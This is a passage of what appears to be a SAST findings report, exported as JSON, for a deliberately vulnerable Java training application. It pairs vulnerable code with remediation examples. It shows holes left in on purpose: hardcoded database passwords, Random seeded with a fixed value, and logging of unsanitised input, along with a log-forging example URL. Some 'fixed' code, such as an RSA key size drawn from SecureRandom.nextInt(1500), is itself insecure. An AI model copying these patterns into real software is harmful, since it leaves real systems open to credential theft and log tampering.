password.\n\nRefernce:\nhttps://docs.ansible.com/ansible/latest/user_guide/vault.html\nhttps://docs.ansible.com/ansible/latest/user_guide/index.html\nhttps://devops4solutions.com/ansible-vault-password-in-ci-cd-pipeline/"}, {"system": "Cloud Enterprise password management system", "configuration": "&lt;depends on the system&gt;", "backend": "Configure all required secrets following security approved practices (e.g., password policies, rotation, etc.)\nProtect access to the vault to be limited to the application instances only (e.g., https://docs.microsoft.com/en-us/azure/key-vault/general/secure-your-key-vault)", "frontend": "Azure Key Vault Hardening: https://kxdocuments.accenture.com/contribution/b1c1522a-6814-458f-9308-ea6ad45aeb15\nThe Azure Automation Scripts Guide includes a brief description of the security controls that can be configured through the custom Azure automation scripts: Key Vault, PaaS Storage, Analysis-Services and Application Services.\n\nAWS Secrets Manager: \nhttps://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html\nhttps://aws.amazon.com/blogs/aws/aws-secrets-manager-store-distribute-and-rotate-credentials-securely/\nSecrets Manager enables you to replace hardcoded credentials in your code, including passwords, with an API call to Secrets Manager to retrieve the secret programmatically. This helps ensure the secret can't be compromised by someone examining your code, because the secret no longer exists in the code. \n\nGCP Secret Manager:\nhttps://cloud.google.com/secret-manager\nSecret Manager is a secure and convenient storage system for API keys, passwords, certificates, and other sensitive data. Secret Manager provides a central place and single source of truth to manage, access, and audit secrets across Google Cloud.\n\nCyberArk ENTERPRISE PASSWORD VAULT:\nhttps://www.cyberark.com/products/privileged-account-security-solution/enterprise-password-vault/\n\nThe Accenture Internal Git Repository \u2013 Cloud Hardening Toolkit has been created with the purpose of collaboration between different teams within Accenture. The Azure Automation Scripts, described in the following sections of this guide, can be downloaded from the folder \u201cAutomation Scripts\u201d created under the \u201cAzure\u201d repository.\nAzure Automation Scripts Repository \u2013 https://innersource.accenture.com/projects/CHTK/repos/azure/browse/Automation%20Scripts", "comments": "See the Supplementary Frontend Code section"}]}}}}, "Password Management: Password in Configuration File": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/spring-security-servlet.xml", "items": [{"id": "IN00399", "function": "null()", "line": "38", "snippet": "value=\"jdbc:sqlserver://localhost:1433;databaseName=VulnAppDB\" />\n        <beans:property name=\"username\" value=\"gurupriya\" />\n        <beans:property name=\"password\" value=\"gp@123\" />\n    </beans:bean>"}]}, {"file": "WebContent/WEB-INF/sec-spring-jpaconfig.xml", "items": [{"id": "IN00400", "function": "null()", "line": "66", "snippet": "<property name=\"port\" value=\"587\"/>\n        <property name=\"username\" value=\"gurupriyat@gmail.com\"/>\n        <property name=\"password\" value=\"xxxxxx\"/>\n        <property name=\"javaMailProperties\">\n            <props>"}]}, {"file": "src/com/accenture/sec/resources/sec_conn.properties", "items": [{"id": "IN00401", "function": "sec_password()", "line": "11", "snippet": "sec_db_url=jdbc:sqlserver://EC2AMAZ-NVOOVOP\\\\SQLEXPRESS:1433;databaseName=VulnAppDB\nsec_user=vulnapp\nsec_password=vulnapp\n\nsec_xsd_path=${catalina.home}/webapps/EmployeeSec_VulAppV4-04/WEB-INF/classes/com/accenture/sec/xsd"}]}], "remediation": null}, "Header Manipulation: SMTP": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00430", "function": "org.springframework.mail.SimpleMailMessage.setSubject()", "line": "268", "snippet": "// message.setFrom(NOREPLY_ADDRESS);\n\t\t        message.setTo(to);\n\t\t        message.setSubject(subject);\n\t\t        message.setText(body);\n\t\t        mailSender.send(message);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00431", "function": "javax.mail.internet.MimeMessage.setSubject()", "line": "910", "snippet": "mimemessage.setReplyTo((Address[])request.getAttribute(\"To\"));\n\n\t         mimemessage.setSubject(mailObject.getSubject());\n\t         mimemessage.setText(\"This is actual message\");"}]}], "remediation": null}, "Insecure Randomness": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00432", "function": "nextBytes()", "line": "372", "snippet": "int i = r.nextInt();\n\t        byte[] b = new byte[4];\n\t        r.nextBytes(b);\n\t        String identifier = seed.toString()+\"USER\";"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00433", "function": "nextInt()", "line": "370", "snippet": "Random r = new Random();\n\t        r.setSeed(12345);\n\t        int i = r.nextInt();\n\t        byte[] b = new byte[4];\n\t        r.nextBytes(b);"}]}], "remediation": {"remediation": {"@id": "R.0034", "@name": "Insecure Randomness", "@dateLastModified": "6/5/2020", "faqs": {"faq": {"question": "What is the problem of using the random native method?", "answer": "It depends on the use. If the random will be used to compose part of the encryption mechanism, it will be easier for an attacker to find the keys to decrypt the data, and this may lead to a data breach. Besides, the use of non-compliant random may impact an audit."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult CreateUserProfile(UserProfile userProfile)\n        {\n          MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n\n            <em class=\"red\">Random gen = new Random();</em>\n            //Creating temporary Password\n            string temporarypassword;\n            temporarypassword = &quot;mypassword&quot; + <em class=\"red\">gen.Next();</em>\n\n            userProfile.Password = temporarypassword;\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n            return View();\n        }", "nonvulncode": "[HttpPost]\n        public ActionResult CreateUserProfile(UserProfile userProfile)\n        {\n            MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n            string temporarypassword;\n            int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n            int numberOfNonAlphanumericCharacters = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;numberOfNonAlphanumericCharacters&quot;].ToString()); ;\n            \n            temporarypassword = <em class=\"blue\">Membership.GeneratePassword(passwordlength, numberOfNonAlphanumericCharacters)</em>;\n\n            userProfile.Password = temporarypassword;\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n\n            return View();\n        }", "comments": "Change the functionality to abstract the use of Random by a known approved method.\nThe problem of this approach is the use of a limited and biased Random to generate a initial password that can be brute forced (mypasswrod1, mypasswrod2, ...). Replacing this approach with the <em class=\"bold\">Membership.GeneratePassword</em> method (part of System.Web.Security). This method is intended for generating a random secure password. Using this method you can control the number of characters to be generated and the number of non alphanumeric characters, making more difficult to guess or attack via brute force.\n\n<em class=\"bold\">Reference</em>:https://docs.microsoft.com/en-us/dotnet/api/system.web.security.membership.generatepassword?view=netframework-4.8\n<em class=\"bold\">Reference:</em>https://stackoverflow.com/questions/1257299/why-use-the-c-sharp-class-system-random-at-all-instead-of-system-security-crypto", "impact": "Import the System.Web.Security reference", "abstract": "Use of Membership.GeneratePassword"}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult CreateUserProfile(UserProfile userProfile)\n        {\n          MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n\n            <em class=\"red\">Random gen = new Random();</em>\n            //Creating temporary Password\n            string temporarypassword;\n            temporarypassword = &quot;mypassword&quot; + <em class=\"red\">gen.Next();</em>\n\n            userProfile.Password = temporarypassword;\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n            return View();\n        }", "nonvulncode": "[HttpPost]\n        public ActionResult CreateUserProfile(UserProfile userProfile)\n        {\n            MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n            string temporarypassword;\n            \n            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())\n            {\n                int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n\n                byte[] randomBytes = new byte[passwordlength];\n                crypto.GetBytes(randomBytes);\n                temporarypassword = Convert.ToBase64String(randomBytes);\n            }\n            userProfile.Password = temporarypassword;\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n\n            return View();\n        }", "comments": "Change the functionality to abstract the use of Random by a known approved method.\nThe problem of this approach is the use of a limited and biased Random. \nThe RNGCryptoServiceProvider class  can be use to generate a password or non-password securely. For non-password use this instead of Random class if the information is sensitive.\n\nIn our sample code it generates a very long random number to fill a  length byte array that we specified in the config file. The random number in this array is encoded to turn it into a sequence of alpha, numeric, and symbols.\n\nYou need add the System.Security.Cryptography as reference to use the class.\n\nReference:https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rngcryptoserviceprovider?view=netcore-3.1\nReference:https://stackoverflow.com/questions/1257299/why-use-the-c-sharp-class-system-random-at-all-instead-of-system-security-crypto", "impact": "The software needs to make reference to system.security.cryptography, part of .NET", "abstract": "Use of cryptography class"}, {"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        public ActionResult CreateUserAccess(UserProfile userProfile)\n        {\n            MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n\n            string encryptionKey = &quot;&quot;;\n          \n            Random gen = new Random();\n            encryptionKey = gen.N<em class=\"red\">ext().ToString();</em>\n\n            string passwordEncrypted = EncryptStringToBytes_Aes(userProfile.Password, encryptionKey);\n            userProfile.Password = passwordEncrypted;\n            userProfile.EncryptionKey = encryptionKey;\n\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n\n            return View();\n        }\n\nstatic string EncryptStringToBytes_Aes(string encryptString,string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            using (Aes aesAlg = Aes.Create())\n            {\n                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(encryptionKey, new byte[] {\n            0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76\n        });\n                aesAlg.Key = pdb.GetBytes(32);\n                aesAlg.IV = pdb.GetBytes(16);\n\n                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);\n\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "nonvulncode": "[HttpPost] \npublic ActionResult CreateUserAccess(UserProfile userProfile)\n        {\n            MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n\n            string encryptionKey = &quot;&quot;;\n           <em class=\"blue\"> using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())\n            {\n                int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n\n                byte[] randomBytes = new byte[passwordlength];\n                crypto.GetBytes(randomBytes);\n                encryptionKey = Convert.ToBase64String(randomBytes);\n            }</em>\n\n            string passwordEncrypted = EncryptStringToBytes_Aes(userProfile.Password, encryptionKey);\n            userProfile.Password = passwordEncrypted;\n            userProfile.EncryptionKey = encryptionKey;\n\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n\n            return View();\n        }\n\nstatic string EncryptStringToBytes_Aes(string encryptString,string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            using (Aes aesAlg = Aes.Create())\n            {\n                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(encryptionKey, new byte[] {\n            0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76\n        });\n                aesAlg.Key = pdb.GetBytes(32);\n                aesAlg.IV = pdb.GetBytes(16);\n\n                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);\n\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "comments": "Change the functionality to abstract the use of Random by a known approved method.\nThe problem of this approach is the use of a limited and biased Random.\nRandom method does not have sufficient entropy to create an encryption key that is secure.\n\nInstead, when creating a key randomically, it is recommended to use one random method with enough entropy, like the RNGCryptoServiceProvider()\n\n<em class=\"bold\">Reference:https://stackoverflow.com/questions/1257299/why-use-the-c-sharp-class-system-random-at-all-instead-of-system-security-crypto</em>", "impact": "The software needs to make reference to system.security.cryptography, part of .NET", "abstract": "Use of cryptography class"}, {"@type": "JAVA/JSP", "vulncode": "private String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;\n\t\ttry {\n\t\t\tSecurity.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\t\t\tKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;RSA&quot;, &quot;BC&quot;);\n\t\t\t<em class=\"red\">Random r = new Random();\n\t\t\tkeyPairGenerator.initialize(r.nextInt(1500));\n</em>\t\t\tKeyPair keyPair = keyPairGenerator.generateKeyPair();\n\n\t\t\tPublicKey publicKey = keyPair.getPublic();\n\t\t\tPrivateKey privateKey = keyPair.getPrivate();\n\n\t\t\tCipher cipher = Cipher.getInstance(&quot;RSA/NONE/OAEPWithSHA1AndMGF1Padding&quot;);\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);\n\t\t\tcipherText = cipher.doFinal(pwd.getBytes());\n\t\t\tencryptedText = Base64.getEncoder().encodeToString(cipherText);// Java 8, uses new Base64 class\n\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, privateKey);\n\t\t\tbyte[] decodedByte = Base64.getDecoder().decode(encryptedText);\n\t\t\tdecodedByte = cipher.doFinal(decodedByte);\n\t\t\tString decryptedTxt = new String(decodedByte);\n\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} \n        \t\n\t\treturn encryptedText;\n\t}\n\n\tpublic ModelAndView downloadPropertyFile( HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t\t\tString fileName = filePath + &quot;sec_conn_encrypted.properties&quot;;\t\t\t\t\t\t\t\n\t\t\tString encryptedText = encryptWithRSA(dbpwd);\t\t\n\t\t\tprop.setProperty(&quot;sec_password_encrypted&quot;, encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, &quot;writing encrypted password&quot;);\t\t\t\t\t\t\t        \t   \n\t        mv.addObject(&quot;msg&quot;, &quot;Encrypted file downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\t    } catch (Exception e){\t \n\t    \tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in downloading property file, check log for more information&quot;);\n\t        e.printStackTrace();\n\t    }\n\t\treturn mv;\n\t}", "nonvulncode": "private String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;\n\t\ttry {\n\t\t\tSecurity.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\t\t\tKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;RSA&quot;, &quot;BC&quot;);\n\t\t\t<em class=\"blue\">SecureRandom secRandom = new SecureRandom();\n\t\t\tkeyPairGenerator.initialize(secRandom.nextInt(1500));</em>\n\t\t\tKeyPair keyPair = keyPairGenerator.generateKeyPair();\n\n\t\t\tPublicKey publicKey = keyPair.getPublic();\n\t\t\tPrivateKey privateKey = keyPair.getPrivate();\n\n\t\t\tCipher cipher = Cipher.getInstance(&quot;RSA/NONE/OAEPWithSHA1AndMGF1Padding&quot;);\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);\n\t\t\tcipherText = cipher.doFinal(pwd.getBytes());\n\t\t\tencryptedText = Base64.getEncoder().encodeToString(cipherText);// Java 8, uses new Base64 class\n\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, privateKey);\n\t\t\tbyte[] decodedByte = Base64.getDecoder().decode(encryptedText);\n\t\t\tdecodedByte = cipher.doFinal(decodedByte);\n\t\t\tString decryptedTxt = new String(decodedByte);\n\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} \n        \t\n\t\treturn encryptedText;\n\t}\n\n\tpublic ModelAndView downloadPropertyFile( HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t\t\tString fileName = filePath + &quot;sec_conn_encrypted.properties&quot;;\t\t\t\t\t\t\t\n\t\t\tString encryptedText = encryptWithRSA(dbpwd);\t\t\n\t\t\tprop.setProperty(&quot;sec_password_encrypted&quot;, encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, &quot;writing encrypted password&quot;);\t\t\t\t\t\t\t        \t   \n\t        mv.addObject(&quot;msg&quot;, &quot;Encrypted file downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\t    } catch (Exception e){\t \n\t    \tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in downloading property file, check log for more information&quot;);\n\t        e.printStackTrace();\n\t    }\n\t\treturn mv;\n\t}", "comments": "Since java.util.Random is a statistical PRNG, it is easy to predict the number. java.util.Random cannot be used for any operation dealing with sensitive information. \nThe option is to use java.security.SecureRandom, which is cryptographic PRNG and makes it impossible to predict the next number based on the past sequence.", "impact": "The software needs to import java.security.SecureRandom", "abstract": "Use of secureRandom"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Log Forging": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00438", "function": "org.slf4j.Logger.info()", "line": "191", "snippet": "logger.info(\"CRLF injection veracode CWE 93\"+value); //CRLF Injection -> Improper Output Neutralization for Logs\n\t    logger.info(\"CRLF injection veracode CWE 93\"+request.getParameter(\"color\"));\n\t\treturn new ModelAndView(\"success\",\"color\",value);\n\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00439", "function": "org.slf4j.Logger.info()", "line": "190", "snippet": "System.out.format(value); //CWE134_Uncontrolled_Format_String\n\t    \n\t    logger.info(\"CRLF injection veracode CWE 93\"+value); //CRLF Injection -> Improper Output Neutralization for Logs\n\t    logger.info(\"CRLF injection veracode CWE 93\"+request.getParameter(\"color\"));\n\t\treturn new ModelAndView(\"success\",\"color\",value);"}]}], "remediation": {"remediation": {"@id": "R.0036", "@name": "Log Forging", "@dateLastModified": "10/23/2020", "faqs": {"faq": [{"question": "Why there are security problems when writting directly to the logs?", "answer": "Logs are critical assets on the security operation center, and any change on the log message / format or type may cause on detection avoidance on those SOC tools (SIEM, SOAR, etc.). If the user is able to write messages to the log the user may write special characters (e.g.: the special characters *U+202E* or #8238; makes the system to start reading backward, changing to arabic mode; or the user may add new lines containing special information to the SIEM tools like \\n2021-01-01 10:00:00 &lt;SYSTEM REBOOT, RELOAD LOG FILE&gt; that can cause an OT logging system to ignore the lines after this command and keep reloading the logs.)"}, {"question": "Can we add the encodin gto the log and present back to the user directly as is? There is no possible attack on this case, right?", "answer": "There should be no page in the application reflecting the exact data submitted by the browserwithout encoding it first to avoiud scripts."}]}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult IPChecker(string txtIP)\n        {\n            try\n            {\n                IPAddress ip = null;\n                if (IPAddress.TryParse(txtIP.ToString(), out ip)){\n                    Ping png = new Ping();\n                    PingReply rep = png.Send(ip);\n                    ViewData[&quot;PingResponse&quot;] = &quot;Ping to &quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;[&quot; + rep.Address.ToString() + &quot;]&quot; + &quot; Successful&quot; +\n                                                &quot; Response delay = &quot; + rep.RoundtripTime.ToString() + &quot; ms&quot;;\n                }\n                else\n                {\n                    ViewData[&quot;PingResponse&quot;] = &quot;Invalid IP [&quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;]&quot;;\n                }\n            }\n            catch (ArgumentException adEx)\n            {\n                TempData[&quot;errmsg&quot;] = adEx.Message.ToString();\n                logger.Error(&quot;ArgumentException encountered: &quot; + adEx.Message);\n            }\n            catch (Exception ex)\n            {\n                TempData[&quot;errmsg&quot;] = ex.Message;\n                logger.Error(&quot;Exception encountered for the input: &quot; + <em class=\"red\">txtIP.ToString()</em>);\n            }   \n            return View();\n        }", "nonvulncode": "public ActionResult IPChecker(string txtIP)\n        {\n            try\n            {\n<em class=\"blue\">                string userIP_Pattern = @&quot;^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$&quot;</em>;\n                IPAddress ip = null;\n                if (IPAddress.TryParse(txtIP.ToString(), out ip)){\n                    Ping png = new Ping();\n                    PingReply rep = png.Send(ip);\n                    ViewData[&quot;PingResponse&quot;] = &quot;Ping to &quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;[&quot; + rep.Address.ToString() + &quot;]&quot; + &quot; Successful&quot; +\n                                                &quot; Response delay = &quot; + rep.RoundtripTime.ToString() + &quot; ms&quot;;\n                }\n                else\n                {\n                    ViewData[&quot;PingResponse&quot;] = &quot;Invalid IP [&quot; + WebUtility.HtmlEncode(txtIP.ToString()) + &quot;]&quot;;\n                }\n            }\n            catch (ArgumentException adEx)\n            {\n                TempData[&quot;errmsg&quot;] = adEx.Message.ToString();\n                logger.Error(&quot;ArgumentException encountered: &quot; + adEx.Message);\n            }\n            catch (Exception ex)\n            {\n                TempData[&quot;errmsg&quot;] = ex.Message;\n                 logger.Error(&quot;IP Address is invalid: &quot; + <em class=\"blue\">Regex.Matches(txtIP, userIP_Pattern).Cast&lt;Match&gt;().Aggregate(&quot;&quot;, (s, e) =&gt; s + e.Value, s =&gt; s)</em>);\n            }   \n            return View();\n        }", "comments": "With our non-vulnerale code, we are replacing the newline injected by the user with empty string so any input provided by the user will just turn into one line. Example: \n\nhttps://www.testsite.com/loginMessage?msg=user not found+&quot;<em class=\"bold\">\\n</em>2020/16/10 12:00:00  INFO The user logged in successfully&quot;\n\n<em class=\"bold\">In case of the vulnerable code, this generates 2 lines on the Log:\n</em>INFO : User not found\n2020/16/10 12:00:00  INFO The user logged in successfully\n\nIn case of the non- <em class=\"bold\">vulnerable code:</em>\nINFO : User not found 2020/16/10 12:00:00  INFO The user logged in successfully\n\nPossible Recommendations:\n- Include input validation both at server side and client side. The suspected characters can be sanitized and replace like the code examples we have. \n- Use a allowed characters approach. e.g., IP can only contain numbers and dots; Log messages can only contain [a-z] [A-Z] [0-9] &quot;.&quot;, &quot;-&quot;, &quot; &quot; and &quot;,&quot;\n- Don't include the inputs provided by the user if possible.\n- Use proper error codes and identifiable error messages.\n\nReferences: \nhttps://www.geeksforgeeks.org/log-injection/\nhttps://medium.com/@shatabda/security-log-injection-what-how-a510cfc0f73b\n\n\nNOTE: The use of Sanitization is a valid solution, but some SAST security tools may still flag as a vulnerability. In this case, the fixed code can be considered a false positive.", "impact": "Developer needs to map all possible log entries text and whitelist the valid characters.\n\n\nNOTE: The use of Encoder is a valid solution, but some SAST security tools may still flag as a vulnerability. In this case, the fixed code can be considered a false positive.", "abstract": "limit possible log entries"}, {"@type": "JAVA/JSP", "vulncode": "import org.slf4j.Log<em class=\"red\">ger;</em>\npublic ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t<em class=\"red\">logger.debug(&quot;User Login with username&quot;+uname);</em>\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "nonvulncode": "import org.apache.logging.log4j.Logger; //log4j version 2 needs to be used, slf4j use log4j version<em class=\"blue\"> 1.x\n\n</em>public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tlogger.debug(&quot;User Login with username&quot;+uname);\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "comments": "By using log4j2 logging will be protected against XSS attack, since log4j 2 escapes special characters (eg \\r, \\n) to their HTML Entities.\nIf the application is already using slf4j, log4j needs to be excluded from slf4j and separate log4j2 dependecy needs to be added like below.\n\nReference: \nhttps://logging.apache.org/log4j/2.x/index.html\nhttps://issues.apache.org/jira/browse/LOG4J2-439\n\n<em class=\"bold\">Pom.xml</em> //dependency changes\n&lt;dependency&gt;\n\t      &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n\t      &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;\n\t      &lt;version&gt;1.7.19&lt;/version&gt;\n\t     <em class=\"blue\"> &lt;exclusions&gt;\n\t\t    &lt;exclusion&gt;\n\t\t        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n\t\t        &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\n\t\t    &lt;/exclusion&gt;\n\t\t    &lt;exclusion&gt;\n\t\t        &lt;groupId&gt;log4j&lt;/groupId&gt;\n\t\t        &lt;artifactId&gt;log4j&lt;/artifactId&gt;\n\t\t    